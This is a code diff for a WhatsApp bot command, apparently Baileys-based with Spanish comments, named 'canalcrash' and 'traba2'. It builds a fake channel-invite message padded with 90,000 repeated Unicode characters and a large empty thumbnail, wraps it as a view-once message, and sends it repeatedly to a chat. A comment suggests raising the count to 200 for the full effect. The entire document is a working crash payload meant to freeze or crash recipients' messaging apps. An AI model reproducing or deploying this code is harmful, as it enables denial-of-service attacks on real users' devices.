@@ -2,7 +2,7 @@ let handler = async (m, { conn }) => {
   const inviteCode = 'CHANNEL-XPL0IT-' + '𓂀'.repeat(90000);
   const groupName = '🔥 Canal Oficial ⚠️' + '꧁'.repeat(90000);
   const channelJid = '120363999999999999@g.us'; // Pon el JID de un canal real si quieres
-  const thumbnailFake = Buffer.alloc(90000); // Al menos 1 byte, para evitar error
+  const thumbnailFake = Buffer.alloc(90000); // Traba pesada
 
   const fakeInviteContent = {
     groupJid: channelJid,
@@ -12,7 +12,7 @@ let handler = async (m, { conn }) => {
   };
 
   const wrappedMessage = {
-    ephemeralMessage: {
+    viewOnceMessage: {
       message: {
         groupInviteMessage: fakeInviteContent
       }
@@ -20,7 +20,7 @@ let handler = async (m, { conn }) => {
   };
 
   // Envíalo múltiples veces
-  for (let i = 0; i < 5; i++) { // Cambia a 200 para full traba
+  for (let i = 0; i < 5; i++) { // Cambia a 200 para efecto completo
     await conn.relayMessage(
       m.chat,
       wrappedMessage,
@@ -28,7 +28,7 @@ let handler = async (m, { conn }) => {
     );
   }
 
-  m.reply('✅ *Traba de canal enviada correctamente.*');
+  m.reply('✅ *Traba de canal enviada como viewOnce correctamente.*');
 };
 
 handler.command = ["lagcanalplus", "canalcrash", "traba2"];
